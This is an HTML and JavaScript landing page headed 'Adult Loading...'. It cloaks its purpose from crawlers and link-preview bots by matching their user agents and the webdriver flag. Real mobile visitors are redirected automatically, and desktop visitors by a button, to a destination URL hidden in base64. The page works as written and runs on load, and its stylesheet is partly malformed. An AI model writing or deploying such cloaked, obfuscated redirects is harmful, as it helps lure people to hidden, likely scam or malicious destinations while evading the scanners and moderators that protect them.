    <style>
    body {
      margin: 0;
      font-family: sans-serif;
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
      flex-direction: column;
    }
    .spinner {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #333;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      margin: 20px auto;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    button {
      padding: 12px 25px;
      font-size: 18px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      display: none;
      margin-top: 20px;
    }

      margin-bottom: 20px;

<body>
  <div class="spinner" id="spinner"></div>
  <h1 id="msg">Adult Loading...</h1>
  <button id="btn">Click to continue</button>

  <script>
    (function () {
      const ua = navigator.userAgent.toLowerCase();
      const botKeywords = [
        'bot','crawl','spider','facebook','twitter','slack','discord',
        'linkedin','preview','whatsapp','telegram','pinterest',
        'reddit','nuzzel','skype','google','bitlybot'
      ];

      const isBot = botKeywords.some(bot => ua.includes(bot)) || navigator.webdriver;

      // Verifica userAgent mobile
      const isMobileUA = /iphone|ipod|ipad|android|iemobile|windows phone/.test(ua);
      // Verifica se touch está ativo no dispositivo
      const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
      // Só considera mobile real se os dois forem verdadeiros
      const isMobileReal = isMobileUA && isTouchDevice;

      const encoded = "aHR0cHM6Ly9iZ2ZmZmlnLmh1YmZsb3dzbS5jb20vcy82M2QwMGUyNDBmY2Q1P3N1YnNvdXJjZT1GU0luZ2xlcw==";
      const url = atob(encoded);

      const msg = document.getElementById("msg");
      const btn = document.getElementById("btn");
      const spinner = document.getElementById("spinner");

      if (isBot) {
        document.body.innerHTML = "<h1>Access denied. Automated systems are not allowed.</h1>";
        return;
      }

      if (isMobileReal) {
        setTimeout(() => {
          window.location.href = url;
        }, 1000);
      } else {
        setTimeout(() => {
          spinner.style.display = 'none';
          msg.innerText = "You're almost there! Please click the button below to continue:";
          btn.style.display = "inline-block";
          btn.onclick = () => window.location.href = url;
        }, 1000);
      }
    })();
  </script>
</body>
